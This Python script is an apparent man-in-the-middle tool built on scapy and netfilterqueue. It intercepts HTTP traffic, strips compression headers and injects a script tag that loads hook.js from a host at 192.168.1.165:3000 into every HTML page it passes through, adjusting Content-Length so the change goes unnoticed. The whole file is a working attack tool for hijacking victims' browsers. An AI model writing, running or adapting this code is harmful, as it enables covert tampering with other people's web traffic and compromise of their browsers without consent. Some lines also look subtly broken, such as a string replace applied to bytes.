from encodings import utf_8
import scapy.all as scapy
import subprocess
import netfilterqueue
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
                
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            #print(scapy_packet.show())
            injection_code = "<script src='http://192.168.1.165:3000/hook.js'></script>"
            load = load.replace("</head>".encode(), (injection_code + "</head>").encode())
            load = load.decode('utf-8', 'ignore')
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", str(load))
            if content_length_search and "text/html" in str(load):
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
                print("[+] Successfully Hooked")
                #print(scapy_packet.show())
        
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))
                
            
    packet.accept()

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("")
